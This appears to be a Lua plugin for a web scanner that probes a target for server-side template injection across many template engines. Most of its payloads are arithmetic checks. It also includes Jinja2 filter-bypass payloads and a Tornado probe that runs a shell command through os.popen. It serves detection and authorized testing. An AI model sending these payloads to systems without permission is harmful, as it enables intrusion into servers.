-- ssti_probe.lua (enhanced)
-- Server-Side Template Injection (SSTI) detection
-- Mapped from: HTB Trial By Fire (Jinja2), PortSwigger SSTI labs (ERB, FreeMarker,
-- Handlebars), DefCamp Rocket (Flask SSTI → RCE)
--
-- Tests:
--   1. Math expression evaluation across 8+ template engines
--   2. Parameter-less URL probing (/?message=, /?name=, etc.)
--   3. Engine fingerprinting for exploitation guidance
--   4. WAF bypass payloads for SSTI

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- Template injection probes — use uncommon multiplication results to avoid FP
-- 913*773=705649 is unlikely to appear naturally in page content
local probes = {
    -- Jinja2 / Twig / Nunjucks (most common in CTF)
    {payload = "{{913*773}}",           expected = "705649",   engine = "Jinja2/Twig/Nunjucks"},
    {payload = "{{913*'7'}}",           expected = "7777777777777", engine = "Jinja2 (confirmed)"},
    -- FreeMarker (Java)
    {payload = "${913*773}",            expected = "705649",   engine = "FreeMarker/Velocity"},
    -- ERB (Ruby — PortSwigger lab)
    {payload = "<%=913*773%>",          expected = "705649",   engine = "ERB/EJS"},
    -- Pebble (Java)
    {payload = "${{913*773}}",          expected = "705649",   engine = "Pebble/Angular"},
    -- Ruby ERB / Java EL
    {payload = "#{913*773}",            expected = "705649",   engine = "Ruby/Java EL"},
    -- Smarty (PHP)
    {payload = "{913*773}",             expected = "705649",   engine = "Smarty"},
    -- Thymeleaf (Spring)
    {payload = "[[${913*773}]]",        expected = "705649",   engine = "Thymeleaf (Spring)"},
    -- Mako (Python)
    {payload = "${913*773}",            expected = "705649",   engine = "Mako"},
    -- Handlebars (Node.js)
    {payload = "{{#with 913}}{{this}}{{/with}}", expected = "913", engine = "Handlebars"},
    -- Tornado (Python)
    {payload = "{%import os%}{{os.popen('echo 705649').read()}}", expected = "705649", engine = "Tornado"},
}

-- WAF bypass variants for Jinja2 (most common in CTF)
local jinja2_bypasses = {
    -- Filter bypass using |attr
    {payload = "{{()|attr('__class__')|attr('__mro__')|last}}", expected = "object", engine = "Jinja2 (filter bypass)"},
    -- String concat bypass
    {payload = "{%set a=913*773%}{{a}}", expected = "705649", engine = "Jinja2 (string check)"},
    -- Unicode bypass
    {payload = "{{'\x37'*913}}", expected = "7777777777777", engine = "Jinja2 (unicode bypass)"},
}

-- Common SSTI-prone parameter names (from PortSwigger + CTF writeups)
local ssti_params = {
    "message", "name", "template", "content", "text", "body",
    "title", "comment", "desc", "greeting", "bio", "value",
    "email", "subject", "feedback", "review", "note", "input",
    "warrior_name", "username",  -- HTB Trial By Fire used warrior_name
}

-- Baseline check: get clean response to detect values that naturally appear in pages
local baseline_body = ""
local baseline_resp = http.get(TARGET)
if baseline_resp and baseline_resp.body then
    baseline_body = baseline_resp.body
end

local function test_ssti(url, param_name, payload, expected, engine)
    -- Skip if the expected value naturally appears in the baseline page (false positive)
    if baseline_body:find(expected, 1, true) then return false end

    local resp = http.get(url)
    if not resp then return false end
    if resp.body and resp.body:find(expected, 1, true) then
        -- Verify it's actual evaluation, not just reflection
        if not resp.body:find(payload, 1, true) then
            report.finding("critical", "custom",
                "SSTI in parameter '" .. param_name .. "' (" .. engine .. ")",
                "Template expression '" .. payload .. "' evaluated to '" .. expected ..
                "'. Engine: " .. engine .. ". " ..
                "This allows arbitrary code execution on the server.",
                url)
            return true
        end
    end
    return false
end

-- ── Phase 1: Test existing query parameters ────────────────────────────────

if TARGET:find("?") then
    for param in TARGET:gmatch("[?&]([^=]+)=") do
        for _, probe in ipairs(probes) do
            local test_url = TARGET:gsub(
                "([?&]" .. param .. "=)[^&]*",
                "%1" .. probe.payload
            )
            if test_url ~= TARGET then
                if test_ssti(test_url, param, probe.payload, probe.expected, probe.engine) then
                    return
                end
            end
        end

        -- Try Jinja2 WAF bypasses if basic payloads didn't work
        for _, bypass in ipairs(jinja2_bypasses) do
            local test_url = TARGET:gsub(
                "([?&]" .. param .. "=)[^&]*",
                "%1" .. bypass.payload
            )
            if test_url ~= TARGET then
                if test_ssti(test_url, param, bypass.payload, bypass.expected, bypass.engine) then
                    return
                end
            end
        end
    end
end

-- ── Phase 2: Probe SSTI-prone parameters on param-less URLs ────────────────

local target_base = TARGET:match("^([^?]+)")
for _, param in ipairs(ssti_params) do
    -- Only test the most reliable probes for discovery (keep request count manageable)
    local fast_probes = {probes[1], probes[2], probes[4], probes[5]}
    for _, probe in ipairs(fast_probes) do
        local test_url = target_base .. "?" .. param .. "=" .. probe.payload
        if test_ssti(test_url, param, probe.payload, probe.expected, probe.engine) then
            return
        end
    end
end

-- ── Phase 3: Test common template-rendering endpoints ──────────────────────

local template_endpoints = {
    "/render", "/preview", "/template", "/api/render",
    "/message", "/greeting", "/feedback", "/comment",
    "/battle-report", "/begin",  -- HTB Trial By Fire endpoints
}

for _, endpoint in ipairs(template_endpoints) do
    local url = base_url .. endpoint
    -- POST with template payload in body
    for _, probe in ipairs(probes) do
        local body = "message=" .. probe.payload .. "&name=" .. probe.payload
        local resp = http.post(url, body)
        if resp and resp.body and resp.body:find(probe.expected, 1, true) then
            if not resp.body:find(probe.payload, 1, true) then
                report.finding("critical", "custom",
                    "SSTI in " .. endpoint .. " (" .. probe.engine .. ")",
                    "Template expression '" .. probe.payload .. "' evaluated to '" ..
                    probe.expected .. "' via POST body injection.",
                    url)
                return
            end
        end
    end
end
